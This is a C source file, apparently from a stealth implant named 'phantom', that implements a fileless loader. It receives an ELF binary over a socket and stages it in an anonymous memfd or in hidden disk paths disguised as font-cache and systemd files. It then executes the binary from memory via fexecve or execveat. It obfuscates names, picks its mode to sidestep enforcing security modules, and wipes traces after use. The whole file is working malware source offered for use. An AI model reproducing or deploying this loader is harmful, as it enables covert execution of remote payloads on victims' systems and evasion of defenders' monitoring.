#include "memfd_loader.h"
#include "crypto_engine.h"
#include "utils.h"
#include "phantom.h"
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/types.h>

static const uint8_t OBF_MEMFD_PREFIX[] = {
    0xC6, 0xC4, 0xC6, 0xC3, 0xC5
};

static void decode_memfd_prefix(char *dst, size_t dst_size)
{
    size_t len = sizeof(OBF_MEMFD_PREFIX);
    if (dst_size <= len) return;
    for (size_t i = 0; i < len; i++) {
        dst[i] = OBF_MEMFD_PREFIX[i] ^ 0xAB;
    }
    dst[len] = '\0';
}

static int generate_memfd_name(char *name, size_t name_len)
{
    if (!name || name_len < 9) {
        return PH_ERR_INVALID_ARG;
    }

    char prefix[8];
    decode_memfd_prefix(prefix, sizeof(prefix));

    size_t prefix_len = strlen(prefix);
    memcpy(name, prefix, prefix_len);

    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    const size_t charset_len = sizeof(charset) - 1;

    uint8_t random_bytes[8];
    ph_crypto_secure_random(random_bytes, sizeof(random_bytes));

    for (size_t i = 0; i < 8; i++) {
        name[prefix_len + i] = charset[random_bytes[i] % charset_len];
    }

    name[prefix_len + 8] = '\0';
    return PH_OK;
}

int ph_memfd_init(ph_memfd_ctx_t *ctx)
{
    if (!ctx) {
        return PH_ERR_NULL_PTR;
    }

    memset(ctx, 0, sizeof(ph_memfd_ctx_t));
    ctx->memfd = -1;
    ctx->exec_mode = PH_EXEC_MODE_MEMFD;
    ctx->is_loaded = 0;
    ctx->is_executed = 0;
    ctx->elf_size = 0;
    ctx->bytes_received = 0;

    int ret = generate_memfd_name(ctx->memfd_name, sizeof(ctx->memfd_name));
    if (ret != PH_OK) {
        return ret;
    }

    ctx->receive_buffer = (uint8_t *)ph_malloc(PH_MEMFD_CHUNK_SIZE);
    if (!ctx->receive_buffer) {
        return PH_ERR_MEMORY;
    }
    ctx->buffer_size = PH_MEMFD_CHUNK_SIZE;

    return PH_OK;
}

int ph_memfd_create_file(ph_memfd_ctx_t *ctx) {
    if (!ctx) return PH_ERR_NULL_PTR;

    // Try memfd_create first (kernel 3.17+)
    #ifdef __x86_64__
    int fd = syscall(319, ctx->memfd_name, MFD_CLOEXEC);
    #elif __aarch64__
    int fd = syscall(279, ctx->memfd_name, MFD_CLOEXEC);
    #elif __i386__
    int fd = syscall(356, ctx->memfd_name, MFD_CLOEXEC);
    #else
    int fd = -1; errno = ENOSYS;
    #endif
     
    if (fd >= 0) {
        ctx->memfd = fd;
        ctx->exec_mode = PH_EXEC_MODE_MEMFD;
        dprintf(STDERR_FILENO, "[+] Binary staged in memfd.\n");
        return PH_OK;
    }
     
    dprintf(STDERR_FILENO, "[!] memfd_create unavailable (kernel <3.17), using disk fallback.\n");
     
    // Fallback chain: /dev/shm → /tmp → /var/tmp → $HOME
    const char *paths[] = {
        "/dev/shm/.font-unix-cache",
        "/tmp/.font-unix-cache", 
        "/var/tmp/.font-unix-cache",
        NULL
    };
     
    for (int i = 0; paths[i]; i++) {
        mkdir(paths[i], 0700);
        char fullpath[256];
        snprintf(fullpath, sizeof(fullpath), "%s/.systemd-timesyncd", paths[i]);
         
        fd = open(fullpath, O_RDWR | O_CREAT | O_TRUNC, 0700);
        if (fd >= 0) {
            ctx->memfd = fd;
            ctx->exec_mode = PH_EXEC_MODE_DISK;
            strncpy(ctx->disk_path, fullpath, sizeof(ctx->disk_path) - 1);
            dprintf(STDERR_FILENO, "[+] Binary staged in %s.\n", fullpath);
            return PH_OK;
        }
    }
     
    dprintf(STDERR_FILENO, "[STAGE_FAIL] No writable staging area found.\n");
    return PH_ERR_STEALTH;
}

void ph_memfd_cleanup(ph_memfd_ctx_t *ctx)
{
    if (!ctx) {
        return;
    }

    if (ctx->memfd >= 0) {
        close(ctx->memfd);
        ctx->memfd = -1;
    }

    if (ctx->receive_buffer) {
        ph_wipe_memory(ctx->receive_buffer, ctx->buffer_size);
        ph_free(ctx->receive_buffer);
        ctx->receive_buffer = NULL;
        ctx->buffer_size = 0;
    }

    ctx->elf_size = 0;
    ctx->bytes_received = 0;
    ctx->is_loaded = 0;
    ctx->is_executed = 0;
    ph_wipe_memory(ctx->memfd_name, sizeof(ctx->memfd_name));
}

int ph_memfd_receive_elf(ph_memfd_ctx_t *ctx, int socket_fd)
{
    if (!ctx || socket_fd < 0) {
        return PH_ERR_INVALID_ARG;
    }

    if (ctx->memfd < 0) {
        int ret = ph_memfd_create_file(ctx);
        if (ret != PH_OK) {
            return ret;
        }
    }

    size_t total_received = 0;
    ssize_t bytes_read;

    while ((bytes_read = read(socket_fd, ctx->receive_buffer, ctx->buffer_size)) > 0) {

        ssize_t bytes_written = write(ctx->memfd, ctx->receive_buffer, (size_t)bytes_read);
        if (bytes_written < 0) {
            write(STDERR_FILENO, "MEMFD_FAIL: write to staging failed\n", 36);
            return PH_ERR_MEMORY;
        }

        total_received += (size_t)bytes_written;
        ctx->bytes_received = total_received;

        if (total_received > PH_MEMFD_MAX_SIZE) {
            write(STDERR_FILENO, "MEMFD_FAIL: payload too large\n", 30);
            return PH_ERR_INVALID_ARG;
        }
    }

    if (bytes_read < 0) {
        write(STDERR_FILENO, "MEMFD_FAIL: read from socket failed\n", 36);
        return PH_ERR_NETWORK;
    }

    ctx->elf_size = total_received;
    ctx->is_loaded = 1;

    lseek(ctx->memfd, 0, SEEK_SET);

    return PH_OK;
}

int ph_memfd_receive_elf_chunked(ph_memfd_ctx_t *ctx, int socket_fd, size_t total_size)
{
    if (!ctx || socket_fd < 0 || total_size == 0) {
        return PH_ERR_INVALID_ARG;
    }

    if (total_size > PH_MEMFD_MAX_SIZE) {
        return PH_ERR_INVALID_ARG;
    }

    if (ctx->memfd < 0) {
        int ret = ph_memfd_create_file(ctx);
        if (ret != PH_OK) {
            return ret;
        }
    }

    size_t total_received = 0;

    while (total_received < total_size) {
        size_t remaining = total_size - total_received;
        size_t chunk_size = (remaining < ctx->buffer_size) ? remaining : ctx->buffer_size;

        ssize_t bytes_read = read(socket_fd, ctx->receive_buffer, chunk_size);
        if (bytes_read < 0) {
            if (errno == EINTR) {
                continue;
            }
            write(STDERR_FILENO, "MEMFD_FAIL: read chunk from socket failed\n", 42);
            return PH_ERR_NETWORK;
        }

        if (bytes_read == 0) {
            write(STDERR_FILENO, "MEMFD_FAIL: premature EOF from socket\n", 38);
            return PH_ERR_NETWORK;
        }

        ssize_t bytes_written = write(ctx->memfd, ctx->receive_buffer, (size_t)bytes_read);
        if (bytes_written < 0) {
            write(STDERR_FILENO, "MEMFD_FAIL: write chunk to staging failed\n", 42);
            return PH_ERR_MEMORY;
        }

        total_received += (size_t)bytes_written;
        ctx->bytes_received = total_received;
    }

    ctx->elf_size = total_size;
    ctx->is_loaded = 1;

    lseek(ctx->memfd, 0, SEEK_SET);

    return PH_OK;
}

int ph_memfd_validate_elf(ph_memfd_ctx_t *ctx, ph_elf_header_t *header)
{
    if (!ctx || !ctx->is_loaded || !header) {
        return PH_ERR_INVALID_ARG;
    }

    if (ctx->elf_size < 64) {
        write(STDERR_FILENO, "MEMFD_FAIL: payload too small for ELF header\n", 45);
        return PH_ERR_INVALID_ARG;
    }

    off_t saved_pos = lseek(ctx->memfd, 0, SEEK_CUR);

    lseek(ctx->memfd, 0, SEEK_SET);

    uint8_t header_buffer[64];
    ssize_t bytes_read = read(ctx->memfd, header_buffer, sizeof(header_buffer));

    lseek(ctx->memfd, saved_pos, SEEK_SET);

    if (bytes_read < 64) {
        write(STDERR_FILENO, "MEMFD_FAIL: failed to read ELF header\n", 38);
        return PH_ERR_INVALID_ARG;
    }

    return ph_memfd_verify_elf_header(header_buffer, (size_t)bytes_read, header);
}

int ph_memfd_verify_elf_header(const uint8_t *buffer, size_t size, ph_elf_header_t *header)
{
    if (!buffer || size < 64 || !header) {
        return PH_ERR_INVALID_ARG;
    }

    memset(header, 0, sizeof(ph_elf_header_t));

    if (buffer[0] != 0x7f || buffer[1] != 'E' || buffer[2] != 'L' || buffer[3] != 'F') {
        header->is_valid = 0;
        write(STDERR_FILENO, "MEMFD_FAIL: invalid ELF magic\n", 30);
        return PH_ERR_INVALID_ARG;
    }

    memcpy(header->magic, buffer, 4);
    header->class = buffer[4];
    header->data = buffer[5];
    header->version = buffer[6];
    header->osabi = buffer[7];

    header->type = (uint16_t)(buffer[17]) << 8 | (uint16_t)(buffer[16]);
    header->machine = (uint16_t)(buffer[19]) << 8 | (uint16_t)(buffer[18]);

    if (header->class == 1) {

        header->entry_point = (uint32_t)(buffer[27]) << 24 |
                              (uint32_t)(buffer[26]) << 16 |
                              (uint32_t)(buffer[25]) << 8 |
                              (uint32_t)(buffer[24]);
    } else if (header->class == 2) {

        header->entry_point = (uint32_t)(buffer[27]) << 24 |
                              (uint32_t)(buffer[26]) << 16 |
                              (uint32_t)(buffer[25]) << 8 |
                              (uint32_t)(buffer[24]);
    } else {
        header->is_valid = 0;
        write(STDERR_FILENO, "MEMFD_FAIL: unsupported ELF class\n", 34);
        return PH_ERR_INVALID_ARG;
    }

    if (header->type != 2 && header->type != 3) {
        header->is_valid = 0;
        write(STDERR_FILENO, "MEMFD_FAIL: invalid ELF type (not EXEC or DYN)\n", 47);
        return PH_ERR_INVALID_ARG;
    }

    header->is_valid = 1;
    return PH_OK;
}

int ph_memfd_execute(ph_memfd_ctx_t *ctx, char *const argv[], char *const envp[])
{
    if (!ctx || !ctx->is_loaded) {
        return PH_ERR_INVALID_ARG;
    }

    int ret;

    ret = ph_memfd_execute_with_fexecve(ctx, argv, envp);
    if (ret == PH_OK) {
        ctx->exec_mode = PH_EXEC_MODE_MEMFD;
        ctx->is_executed = 1;
        return PH_OK;
    }

    ret = ph_memfd_execute_with_execveat(ctx, argv, envp);
    if (ret == PH_OK) {
        ctx->exec_mode = PH_EXEC_MODE_EXECVEAT;
        ctx->is_executed = 1;
        return PH_OK;
    }

    write(STDERR_FILENO, "MEMFD_FAIL: direct memory execution failed\n", 43);
    return PH_ERR_STEALTH;
}

int ph_memfd_execute_with_fexecve(ph_memfd_ctx_t *ctx, char *const argv[], char *const envp[])
{
    if (!ctx || ctx->memfd < 0) {
        return PH_ERR_INVALID_ARG;
    }

    lseek(ctx->memfd, 0, SEEK_SET);

    int ret = fexecve(ctx->memfd, argv, envp);
    if (ret < 0) {
        return PH_ERR_STEALTH;
    }

    ctx->is_executed = 1;
    return PH_OK;
}

int ph_memfd_execute_with_execveat(ph_memfd_ctx_t *ctx, char *const argv[], char *const envp[])
{
    if (!ctx || ctx->memfd < 0) {
        return PH_ERR_INVALID_ARG;
    }

    lseek(ctx->memfd, 0, SEEK_SET);

#ifndef AT_EMPTY_PATH
#define AT_EMPTY_PATH 0x1000
#endif

    int ret = (int)syscall(SYS_execveat, ctx->memfd, "", argv, envp, AT_EMPTY_PATH);
    if (ret < 0) {
        return PH_ERR_STEALTH;
    }

    ctx->is_executed = 1;
    return PH_OK;
}

int ph_memfd_execute_disk_fallback(ph_memfd_ctx_t *ctx, const char *disk_path, char *const argv[], char *const envp[])
{
    if (!ctx || !disk_path) {
        return PH_ERR_INVALID_ARG;
    }

    int fd = open(disk_path, O_WRONLY | O_CREAT | O_TRUNC, 0700);
    if (fd < 0) {
        write(STDERR_FILENO, "MEMFD_FAIL: failed to open disk fallback path\n", 46);
        return PH_ERR_MEMORY;
    }

    off_t saved_pos = lseek(ctx->memfd, 0, SEEK_CUR);

    lseek(ctx->memfd, 0, SEEK_SET);

    uint8_t buffer[PH_MEMFD_CHUNK_SIZE];
    ssize_t bytes_read;
    size_t total_written = 0;

    while ((bytes_read = read(ctx->memfd, buffer, sizeof(buffer))) > 0) {
        ssize_t bytes_written = write(fd, buffer, (size_t)bytes_read);
        if (bytes_written < 0) {
            close(fd);
            lseek(ctx->memfd, saved_pos, SEEK_SET);
            write(STDERR_FILENO, "MEMFD_FAIL: failed to write to disk fallback\n", 45);
            return PH_ERR_MEMORY;
        }
        total_written += (size_t)bytes_written;
    }

    lseek(ctx->memfd, saved_pos, SEEK_SET);
    close(fd);

    if (total_written != ctx->elf_size) {
        write(STDERR_FILENO, "MEMFD_FAIL: disk fallback size mismatch\n", 40);
        return PH_ERR_MEMORY;
    }

    int ret = execve(disk_path, argv, envp);
    if (ret < 0) {
        write(STDERR_FILENO, "MEMFD_FAIL: disk fallback execution failed\n", 43);
        unlink(disk_path);
        return PH_ERR_STEALTH;
    }

    ctx->is_executed = 1;
    ctx->exec_mode = PH_EXEC_MODE_DISK;
    return PH_OK;
}

int ph_memfd_wipe_buffer(ph_memfd_ctx_t *ctx)
{
    if (!ctx || !ctx->receive_buffer) {
        return PH_ERR_INVALID_ARG;
    }

    ph_crypto_secure_random(ctx->receive_buffer, ctx->buffer_size);

    ph_wipe_memory(ctx->receive_buffer, ctx->buffer_size);

    ctx->bytes_received = 0;
    return PH_OK;
}

int ph_memfd_seal_file(ph_memfd_ctx_t *ctx)
{
    if (!ctx || ctx->memfd < 0) {
        return PH_ERR_INVALID_ARG;
    }

#ifndef F_ADD_SEALS
#define F_ADD_SEALS 1033
#endif

#ifndef F_SEAL_SEAL
#define F_SEAL_SEAL    0x0010
#endif
#ifndef F_SEAL_SHRINK
#define F_SEAL_SHRINK  0x0020
#endif
#ifndef F_SEAL_GROW
#define F_SEAL_GROW    0x0040
#endif
#ifndef F_SEAL_WRITE
#define F_SEAL_WRITE   0x0080
#endif

    int seals = F_SEAL_SEAL | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE;

    int ret = fcntl(ctx->memfd, F_ADD_SEALS, seals);
    if (ret < 0) {
        write(STDERR_FILENO, "MEMFD_FAIL: failed to seal memfd\n", 33);
        return PH_ERR_STEALTH;
    }

    return PH_OK;
}

const char* ph_memfd_exec_mode_name(ph_exec_mode_t mode)
{
    switch (mode) {
        case PH_EXEC_MODE_MEMFD:
            return "memfd";
        case PH_EXEC_MODE_EXECVEAT:
            return "execveat";
        case PH_EXEC_MODE_DISK:
            return "disk";
        default:
            return "unknown";
    }
}

int ph_memfd_select_mode(ph_memfd_ctx_t *ctx, ph_security_status_t *security)
{
    if (!ctx) {
        return PH_ERR_NULL_PTR;
    }

    ph_kernel_features_t features;
    int ret = ph_kernel_detect_features(&features);
    if (ret != PH_OK) {
        ctx->exec_mode = PH_EXEC_MODE_DISK;
        return PH_OK;
    }

    if (security && security->is_enforcing) {
        ctx->exec_mode = PH_EXEC_MODE_DISK;
        return PH_OK;
    }

    if (features.has_memfd_create) {
        ctx->exec_mode = PH_EXEC_MODE_MEMFD;
        return PH_OK;
    }

    if (features.has_execveat) {
        ctx->exec_mode = PH_EXEC_MODE_EXECVEAT;
        return PH_OK;
    }

    ctx->exec_mode = PH_EXEC_MODE_DISK;
    return PH_OK;
}
